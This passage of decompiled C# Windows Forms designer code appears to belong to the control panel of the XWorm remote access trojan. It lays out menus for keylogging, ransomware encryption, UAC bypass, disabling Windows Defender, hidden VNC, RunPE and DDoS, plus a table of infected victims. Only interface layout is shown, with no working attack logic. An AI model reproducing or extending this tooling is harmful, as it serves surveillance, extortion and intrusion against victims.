			this.ClipboardManagerToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ClipboardManagerToolStripMenuItem1.Image");
			this.ClipboardManagerToolStripMenuItem1.Name = "ClipboardManagerToolStripMenuItem1";
			this.ClipboardManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.ClipboardManagerToolStripMenuItem1.Text = "[ Clipboard Manager ]";
			this.InstalledProgramsToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.InstalledProgramsToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("InstalledProgramsToolStripMenuItem1.Image");
			this.InstalledProgramsToolStripMenuItem1.Name = "InstalledProgramsToolStripMenuItem1";
			this.InstalledProgramsToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.InstalledProgramsToolStripMenuItem1.Text = "[ Installed Programs ]";
			this.VBNetCompilerToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.VBNetCompilerToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("VBNetCompilerToolStripMenuItem1.Image");
			this.VBNetCompilerToolStripMenuItem1.Name = "VBNetCompilerToolStripMenuItem1";
			this.VBNetCompilerToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.VBNetCompilerToolStripMenuItem1.Text = "[ VB.NET Compiler ]";
			this.DDosAttackToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.DDosAttackToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DDosAttackToolStripMenuItem1.Image");
			this.DDosAttackToolStripMenuItem1.Name = "DDosAttackToolStripMenuItem1";
			this.DDosAttackToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.DDosAttackToolStripMenuItem1.Text = "[ DDos Attack ]";
			this.LocationManagerToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.LocationManagerToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("LocationManagerToolStripMenuItem.Image");
			this.LocationManagerToolStripMenuItem.Name = "LocationManagerToolStripMenuItem";
			this.LocationManagerToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.LocationManagerToolStripMenuItem.Text = "[ Location Manager ]";
			this.PastimeToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.PastimeToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("PastimeToolStripMenuItem1.Image");
			this.PastimeToolStripMenuItem1.Name = "PastimeToolStripMenuItem1";
			this.PastimeToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.PastimeToolStripMenuItem1.Text = "[ Pastime ]";
			this.PowerToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.PowerToolStripMenuItem2.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ShutdownToolStripMenuItem,
				this.RestartToolStripMenuItem4,
				this.LogoffToolStripMenuItem
			});
			this.PowerToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("PowerToolStripMenuItem2.Image");
			this.PowerToolStripMenuItem2.Name = "PowerToolStripMenuItem2";
			this.PowerToolStripMenuItem2.Size = new global::System.Drawing.Size(190, 22);
			this.PowerToolStripMenuItem2.Text = "[ Power ]";
			this.ShutdownToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ShutdownToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ShutdownToolStripMenuItem.Image");
			this.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem";
			this.ShutdownToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.ShutdownToolStripMenuItem.Text = "[ Shutdown ]";
			this.RestartToolStripMenuItem4.BackColor = global::System.Drawing.Color.White;
			this.RestartToolStripMenuItem4.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RestartToolStripMenuItem4.Image");
			this.RestartToolStripMenuItem4.Name = "RestartToolStripMenuItem4";
			this.RestartToolStripMenuItem4.Size = new global::System.Drawing.Size(180, 22);
			this.RestartToolStripMenuItem4.Text = "[ Restart ]";
			this.LogoffToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.LogoffToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("LogoffToolStripMenuItem.Image");
			this.LogoffToolStripMenuItem.Name = "LogoffToolStripMenuItem";
			this.LogoffToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.LogoffToolStripMenuItem.Text = "[ Logoff ]";
			this.DisableUACToolStripMenuItem.Image = global::XWorm.My.Resources.Resources._9195850;
			this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
			this.DisableUACToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.DisableUACToolStripMenuItem.Text = "Disable UAC";
			this.Extra1ToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.Extra1ToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ReportWindowToolStripMenuItem1,
				this.VoiceChatToolStripMenuItem,
				this.PerformanceToolStripMenuItem1,
				this.EditHostsToolStripMenuItem,
				this.KeyLoggerToolStripMenuItem1,
				this.ClientChatToolStripMenuItem,
				this.FilesSearcherToolStripMenuItem1,
				this.UACBypassToolStripMenuItem1,
				this.CommandsToolStripMenuItem,
				this.MessageBoxToolStripMenuItem
			});
			this.Extra1ToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Extra1ToolStripMenuItem.Image");
			this.Extra1ToolStripMenuItem.Name = "Extra1ToolStripMenuItem";
			this.Extra1ToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.Extra1ToolStripMenuItem.Text = "[ Extra 1 ]";
			this.ReportWindowToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ReportWindowToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.StartToolStripMenuItem,
				this.StopToolStripMenuItem
			});
			this.ReportWindowToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ReportWindowToolStripMenuItem1.Image");
			this.ReportWindowToolStripMenuItem1.Name = "ReportWindowToolStripMenuItem1";
			this.ReportWindowToolStripMenuItem1.Size = new global::System.Drawing.Size(167, 22);
			this.ReportWindowToolStripMenuItem1.Text = "[ ReportWindow ]";
			this.StartToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.StartToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("StartToolStripMenuItem.Image");
			this.StartToolStripMenuItem.Name = "StartToolStripMenuItem";
			this.StartToolStripMenuItem.Size = new global::System.Drawing.Size(112, 22);
			this.StartToolStripMenuItem.Text = "[ Start ]";
			this.StopToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.StopToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("StopToolStripMenuItem.Image");
			this.StopToolStripMenuItem.Name = "StopToolStripMenuItem";
			this.StopToolStripMenuItem.Size = new global::System.Drawing.Size(112, 22);
			this.StopToolStripMenuItem.Text = "[ Stop ]";
			this.VoiceChatToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.VoiceChatToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("VoiceChatToolStripMenuItem.Image");
			this.VoiceChatToolStripMenuItem.Name = "VoiceChatToolStripMenuItem";
			this.VoiceChatToolStripMenuItem.Size = new global::System.Drawing.Size(167, 22);
			this.VoiceChatToolStripMenuItem.Text = "[ Voice Chat ]";
			this.PerformanceToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.PerformanceToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("PerformanceToolStripMenuItem1.Image");
			this.PerformanceToolStripMenuItem1.Name = "PerformanceToolStripMenuItem1";
			this.PerformanceToolStripMenuItem1.Size = new global::System.Drawing.Size(167, 22);
			this.PerformanceToolStripMenuItem1.Text = "[ Performance ]";
			this.EditHostsToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.EditHostsToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EditHostsToolStripMenuItem.Image");
			this.EditHostsToolStripMenuItem.Name = "EditHostsToolStripMenuItem";
			this.EditHostsToolStripMenuItem.Size = new global::System.Drawing.Size(167, 22);
			this.EditHostsToolStripMenuItem.Text = "[ Edit Hosts ]";
			this.KeyLoggerToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.KeyLoggerToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.OfflineToolStripMenuItem1,
				this.OnlineToolStripMenuItem1
			});
			this.KeyLoggerToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("KeyLoggerToolStripMenuItem1.Image");
			this.KeyLoggerToolStripMenuItem1.Name = "KeyLoggerToolStripMenuItem1";
			this.KeyLoggerToolStripMenuItem1.Size = new global::System.Drawing.Size(167, 22);
			this.KeyLoggerToolStripMenuItem1.Text = "[ KeyLogger ]";
			this.OfflineToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.OfflineToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("OfflineToolStripMenuItem1.Image");
			this.OfflineToolStripMenuItem1.Name = "OfflineToolStripMenuItem1";
			this.OfflineToolStripMenuItem1.Size = new global::System.Drawing.Size(124, 22);
			this.OfflineToolStripMenuItem1.Text = "[ Offline ]";
			this.OnlineToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.OnlineToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("OnlineToolStripMenuItem1.Image");
			this.OnlineToolStripMenuItem1.Name = "OnlineToolStripMenuItem1";
			this.OnlineToolStripMenuItem1.Size = new global::System.Drawing.Size(124, 22);
			this.OnlineToolStripMenuItem1.Text = "[ Online ]";
			this.ClientChatToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ClientChatToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ClientChatToolStripMenuItem.Image");
			this.ClientChatToolStripMenuItem.Name = "ClientChatToolStripMenuItem";
			this.ClientChatToolStripMenuItem.Size = new global::System.Drawing.Size(167, 22);
			this.ClientChatToolStripMenuItem.Text = "[ Client Chat ]";
			this.FilesSearcherToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.FilesSearcherToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FilesSearcherToolStripMenuItem1.Image");
			this.FilesSearcherToolStripMenuItem1.Name = "FilesSearcherToolStripMenuItem1";
			this.FilesSearcherToolStripMenuItem1.Size = new global::System.Drawing.Size(167, 22);
			this.FilesSearcherToolStripMenuItem1.Text = "[ FilesSearcher ]";
			this.UACBypassToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.UACBypassToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RunAsToolStripMenuItem1
			});
			this.UACBypassToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("UACBypassToolStripMenuItem1.Image");
			this.UACBypassToolStripMenuItem1.Name = "UACBypassToolStripMenuItem1";
			this.UACBypassToolStripMenuItem1.Size = new global::System.Drawing.Size(167, 22);
			this.UACBypassToolStripMenuItem1.Text = "[ UAC Bypass ]";
			this.RunAsToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RunAsToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RunAsToolStripMenuItem1.Image");
			this.RunAsToolStripMenuItem1.Name = "RunAsToolStripMenuItem1";
			this.RunAsToolStripMenuItem1.Size = new global::System.Drawing.Size(122, 22);
			this.RunAsToolStripMenuItem1.Text = "[ RunAs ]";
			this.CommandsToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.CommandsToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("CommandsToolStripMenuItem.Image");
			this.CommandsToolStripMenuItem.Name = "CommandsToolStripMenuItem";
			this.CommandsToolStripMenuItem.Size = new global::System.Drawing.Size(167, 22);
			this.CommandsToolStripMenuItem.Text = "[ Commands ]";
			this.MessageBoxToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.MessageBoxToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MessageBoxToolStripMenuItem.Image");
			this.MessageBoxToolStripMenuItem.Name = "MessageBoxToolStripMenuItem";
			this.MessageBoxToolStripMenuItem.Size = new global::System.Drawing.Size(167, 22);
			this.MessageBoxToolStripMenuItem.Text = "[ MessageBox ]";
			this.Extra2ToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.Extra2ToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RansomwareToolStripMenuItem1,
				this.ReverseProxyToolStripMenuItem1,
				this.HiddenBrowserToolStripMenuItem,
				this.HiddenVNCToolStripMenuItem,
				this.HiddenAppsToolStripMenuItem,
				this.BotkillerToolStripMenuItem,
				this.WDKillerToolStripMenuItem,
				this.WDDisableToolStripMenuItem,
				this.WDExclusionToolStripMenuItem
			});
			this.Extra2ToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("Extra2ToolStripMenuItem1.Image");
			this.Extra2ToolStripMenuItem1.Name = "Extra2ToolStripMenuItem1";
			this.Extra2ToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.Extra2ToolStripMenuItem1.Text = "[ Extra 2 ]";
			this.RansomwareToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.RansomwareToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EncryptToolStripMenuItem1,
				this.DecryptToolStripMenuItem1
			});
			this.RansomwareToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RansomwareToolStripMenuItem1.Image");
			this.RansomwareToolStripMenuItem1.Name = "RansomwareToolStripMenuItem1";
			this.RansomwareToolStripMenuItem1.Size = new global::System.Drawing.Size(172, 22);
			this.RansomwareToolStripMenuItem1.Text = "[ Ransomware ]";
			this.EncryptToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.EncryptToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("EncryptToolStripMenuItem1.Image");
			this.EncryptToolStripMenuItem1.Name = "EncryptToolStripMenuItem1";
			this.EncryptToolStripMenuItem1.Size = new global::System.Drawing.Size(129, 22);
			this.EncryptToolStripMenuItem1.Text = "[ Encrypt ]";
			this.DecryptToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.DecryptToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("DecryptToolStripMenuItem1.Image");
			this.DecryptToolStripMenuItem1.Name = "DecryptToolStripMenuItem1";
			this.DecryptToolStripMenuItem1.Size = new global::System.Drawing.Size(129, 22);
			this.DecryptToolStripMenuItem1.Text = "[ Decrypt ]";
			this.ReverseProxyToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ReverseProxyToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ReverseProxyToolStripMenuItem1.Image");
			this.ReverseProxyToolStripMenuItem1.Name = "ReverseProxyToolStripMenuItem1";
			this.ReverseProxyToolStripMenuItem1.Size = new global::System.Drawing.Size(172, 22);
			this.ReverseProxyToolStripMenuItem1.Text = "[ Reverse Proxy ]";
			this.HiddenBrowserToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.HiddenBrowserToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("HiddenBrowserToolStripMenuItem.Image");
			this.HiddenBrowserToolStripMenuItem.Name = "HiddenBrowserToolStripMenuItem";
			this.HiddenBrowserToolStripMenuItem.Size = new global::System.Drawing.Size(172, 22);
			this.HiddenBrowserToolStripMenuItem.Text = "[ Hidden Browser ]";
			this.HiddenVNCToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.HiddenVNCToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RunPEToolStripMenuItem,
				this.MemoryToolStripMenuItem2
			});
			this.HiddenVNCToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("HiddenVNCToolStripMenuItem.Image");
			this.HiddenVNCToolStripMenuItem.Name = "HiddenVNCToolStripMenuItem";
			this.HiddenVNCToolStripMenuItem.Size = new global::System.Drawing.Size(172, 22);
			this.HiddenVNCToolStripMenuItem.Text = "[ Hidden VNC ]";
			this.RunPEToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.RunPEToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RunPEToolStripMenuItem.Image");
			this.RunPEToolStripMenuItem.Name = "RunPEToolStripMenuItem";
			this.RunPEToolStripMenuItem.Size = new global::System.Drawing.Size(133, 22);
			this.RunPEToolStripMenuItem.Text = "[ RunPE ]";
			this.MemoryToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.MemoryToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MemoryToolStripMenuItem2.Image");
			this.MemoryToolStripMenuItem2.Name = "MemoryToolStripMenuItem2";
			this.MemoryToolStripMenuItem2.Size = new global::System.Drawing.Size(133, 22);
			this.MemoryToolStripMenuItem2.Text = "[ Memory ]";
			this.HiddenAppsToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.HiddenAppsToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("HiddenAppsToolStripMenuItem.Image");
			this.HiddenAppsToolStripMenuItem.Name = "HiddenAppsToolStripMenuItem";
			this.HiddenAppsToolStripMenuItem.Size = new global::System.Drawing.Size(172, 22);
			this.HiddenAppsToolStripMenuItem.Text = "[ Hidden Apps ]";
			this.BotkillerToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.BotkillerToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BotkillerToolStripMenuItem.Image");
			this.BotkillerToolStripMenuItem.Name = "BotkillerToolStripMenuItem";
			this.BotkillerToolStripMenuItem.Size = new global::System.Drawing.Size(172, 22);
			this.BotkillerToolStripMenuItem.Text = "[ Botkiller ]";
			this.WDKillerToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.WDKillerToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("WDKillerToolStripMenuItem.Image");
			this.WDKillerToolStripMenuItem.Name = "WDKillerToolStripMenuItem";
			this.WDKillerToolStripMenuItem.Size = new global::System.Drawing.Size(172, 22);
			this.WDKillerToolStripMenuItem.Text = "[ WDKiller ]";
			this.WDDisableToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.WDDisableToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("WDDisableToolStripMenuItem.Image");
			this.WDDisableToolStripMenuItem.Name = "WDDisableToolStripMenuItem";
			this.WDDisableToolStripMenuItem.Size = new global::System.Drawing.Size(172, 22);
			this.WDDisableToolStripMenuItem.Text = "[ WDDisable ]";
			this.WDExclusionToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.WDExclusionToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("WDExclusionToolStripMenuItem.Image");
			this.WDExclusionToolStripMenuItem.Name = "WDExclusionToolStripMenuItem";
			this.WDExclusionToolStripMenuItem.Size = new global::System.Drawing.Size(172, 22);
			this.WDExclusionToolStripMenuItem.Text = "[ WDExclusion ]";
			this.ClientToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.ClientToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RestartToolStripMenuItem,
				this.CloseToolStripMenuItem1,
				this.UninstallToolStripMenuItem1,
				this.UpdateToolStripMenuItem1,
				this.NoteToolStripMenuItem1
			});
			this.ClientToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ClientToolStripMenuItem1.Image");
			this.ClientToolStripMenuItem1.Name = "ClientToolStripMenuItem1";
			this.ClientToolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.ClientToolStripMenuItem1.Text = "[ Client ]";
			this.RestartToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.RestartToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RestartToolStripMenuItem.Image");
			this.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem";
			this.RestartToolStripMenuItem.Size = new global::System.Drawing.Size(134, 22);
			this.RestartToolStripMenuItem.Text = "[ Restart ]";
			this.CloseToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.CloseToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("CloseToolStripMenuItem1.Image");
			this.CloseToolStripMenuItem1.Name = "CloseToolStripMenuItem1";
			this.CloseToolStripMenuItem1.Size = new global::System.Drawing.Size(134, 22);
			this.CloseToolStripMenuItem1.Text = "[ Close ]";
			this.UninstallToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.UninstallToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("UninstallToolStripMenuItem1.Image");
			this.UninstallToolStripMenuItem1.Name = "UninstallToolStripMenuItem1";
			this.UninstallToolStripMenuItem1.Size = new global::System.Drawing.Size(134, 22);
			this.UninstallToolStripMenuItem1.Text = "[ Uninstall ]";
			this.UpdateToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.UpdateToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("UpdateToolStripMenuItem1.Image");
			this.UpdateToolStripMenuItem1.Name = "UpdateToolStripMenuItem1";
			this.UpdateToolStripMenuItem1.Size = new global::System.Drawing.Size(134, 22);
			this.UpdateToolStripMenuItem1.Text = "[ Update ]";
			this.NoteToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.NoteToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("NoteToolStripMenuItem1.Image");
			this.NoteToolStripMenuItem1.Name = "NoteToolStripMenuItem1";
			this.NoteToolStripMenuItem1.Size = new global::System.Drawing.Size(134, 22);
			this.NoteToolStripMenuItem1.Text = "[ Note ]";
			this.ClientFolderToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ClientFolderToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ClientFolderToolStripMenuItem.Image");
			this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
			this.ClientFolderToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.ClientFolderToolStripMenuItem.Text = "[ Client Folder ]";
			this.Guna2Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Guna2Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.Guna2Panel1.Name = "Guna2Panel1";
			this.Guna2Panel1.Size = new global::System.Drawing.Size(915, 4);
			this.Guna2Panel1.TabIndex = 37;
			this.Guna2Panel5.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Guna2Panel5.Location = new global::System.Drawing.Point(0, 29);
			this.Guna2Panel5.Name = "Guna2Panel5";
			this.Guna2Panel5.Size = new global::System.Drawing.Size(915, 4);
			this.Guna2Panel5.TabIndex = 38;
			this.Guna2NotificationPaint1.FillColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2NotificationPaint1.Size = new global::System.Drawing.Size(30, 18);
			this.Guna2NotificationPaint1.TargetControl = this.Guna2Button2;
			this.Guna2HtmlToolTip1.AllowLinksHandling = true;
			this.Guna2HtmlToolTip1.AutoPopDelay = 9000;
			this.Guna2HtmlToolTip1.InitialDelay = 500;
			this.Guna2HtmlToolTip1.MaximumSize = new global::System.Drawing.Size(0, 0);
			this.Guna2HtmlToolTip1.ReshowDelay = 100;
			this.PowerToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.PowerToolStripMenuItem.Name = "PowerToolStripMenuItem";
			this.PowerToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.PowerToolStripMenuItem.Text = "[ Power ]";
			this.Lv1.BackColor = global::System.Drawing.Color.White;
			this.Lv1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.Lv1.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this._IP,
				this._Country,
				this._ID,
				this._Username,
				this._Operating,
				this._Group,
				this._Date,
				this._USB,
				this._UAC,
				this._Cam,
				this._CPU,
				this._GPU,
				this._Ram,
				this._Antivirus,
				this._Note,
				this._idle,
				this._Ping,
				this._ActiveWindow
			});
			this.Lv1.ContextMenuStrip = this.Guna2ContextMenuStrip3;
			this.Lv1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Lv1.Font = new global::System.Drawing.Font("Tahoma", 8f);
			this.Lv1.ForeColor = global::System.Drawing.Color.Black;
			this.Lv1.FullRowSelect = true;
			this.Lv1.HideSelection = false;
			this.Lv1.Location = new global::System.Drawing.Point(73, 33);
			this.Lv1.Name = "Lv1";
			this.Lv1.ShowGroups = false;
			this.Lv1.ShowItemToolTips = true;
			this.Lv1.Size = new global::System.Drawing.Size(842, 390);
			this.Lv1.SmallImageList = this.ii;
			this.Lv1.TabIndex = 0;
			this.Lv1.UseCompatibleStateImageBehavior = false;
			this.Lv1.View = global::System.Windows.Forms.View.Details;
			this._IP.Text = "[ IP ]";
			this._IP.Width = 129;
			this._Country.Text = "[ Country ]";
			this._Country.Width = 98;
			this._ID.Text = "[ ID ]";
			this._ID.Width = 104;
			this._Username.Text = "[ Username ]";
			this._Username.Width = 88;
			this._Operating.Text = "[ Operating System ]";
			this._Operating.Width = 137;
			this._Group.Text = "[ Group ]";
			this._Group.Width = 123;
			this._Date.Text = "[ Date ]";
			this._Date.Width = 108;
			this._USB.Text = "[ USB? ]";
			this._USB.Width = 78;
			this._UAC.Text = "[ UAC? ]";
			this._UAC.Width = 72;
			this._Cam.Text = "[ Cam? ]";
			this._Cam.Width = 97;
			this._CPU.Text = "[ CPU ]";
			this._CPU.Width = 170;
			this._GPU.Text = "[ GPU ]";
			this._GPU.Width = 170;
			this._Ram.Text = "[ RAM ]";
			this._Ram.Width = 100;
			this._Antivirus.Text = "[ Antivirus ]";
			this._Antivirus.Width = 150;
			this._Note.Text = "[ Note ]";
			this._Note.Width = 82;
			this._idle.Text = "[ LastInputTime ]";
			this._idle.Width = 130;
			this._Ping.Text = "[ Ping ]";
			this._Ping.Width = 80;
			this._ActiveWindow.Text = "[ ActiveWindow ]";
			this._ActiveWindow.Width = 350;
			this.Lv2.BackColor = global::System.Drawing.Color.White;
			this.Lv2.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.Lv2.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.ColumnHeader16,
				this.ColumnHeader17
			});
			this.Lv2.ContextMenuStrip = this.Guna2ContextMenuStrip2;
			this.Lv2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Lv2.Font = new global::System.Drawing.Font("Tahoma", 8f);
			this.Lv2.ForeColor = global::System.Drawing.Color.Black;
			this.Lv2.FullRowSelect = true;
			this.Lv2.HideSelection = false;
			this.Lv2.Location = new global::System.Drawing.Point(73, 33);
			this.Lv2.Name = "Lv2";
			this.Lv2.ShowGroups = false;
			this.Lv2.ShowItemToolTips = true;
			this.Lv2.Size = new global::System.Drawing.Size(842, 390);
			this.Lv2.TabIndex = 3;
			this.Lv2.UseCompatibleStateImageBehavior = false;
			this.Lv2.View = global::System.Windows.Forms.View.Details;
			this.ColumnHeader16.Text = "[ Time ]";
			this.ColumnHeader16.Width = 123;
			this.ColumnHeader17.Text = "[ Message ]";
			this.ColumnHeader17.Width = 624;
			this.Lv3.BackColor = global::System.Drawing.Color.White;
			this.Lv3.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.Lv3.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.ColumnHeader12,
				this.ColumnHeader13
			});
			this.Lv3.ContextMenuStrip = this.Guna2ContextMenuStrip1;
			this.Lv3.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Lv3.Font = new global::System.Drawing.Font("Tahoma", 8f);
			this.Lv3.ForeColor = global::System.Drawing.Color.Black;
			this.Lv3.FullRowSelect = true;
			this.Lv3.HideSelection = false;
			this.Lv3.Location = new global::System.Drawing.Point(73, 33);
			this.Lv3.Name = "Lv3";
			this.Lv3.Size = new global::System.Drawing.Size(842, 390);
			this.Lv3.TabIndex = 4;
			this.Lv3.UseCompatibleStateImageBehavior = false;
			this.Lv3.View = global::System.Windows.Forms.View.Details;
			this.ColumnHeader12.Text = "[ Task ]";
			this.ColumnHeader12.Width = 123;
			this.ColumnHeader13.Text = "[ Execution ]";
			this.ColumnHeader13.Width = 237;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(915, 445);
			base.Controls.Add(this.Lv1);
			base.Controls.Add(this.Lv2);
			base.Controls.Add(this.Lv4);
			base.Controls.Add(this.Lv3);
			base.Controls.Add(this.Guna2Panel6);
			base.Controls.Add(this.StatusStrip1);
			base.Controls.Add(this.Guna2Panel5);
			base.Controls.Add(this.Guna2Panel2);
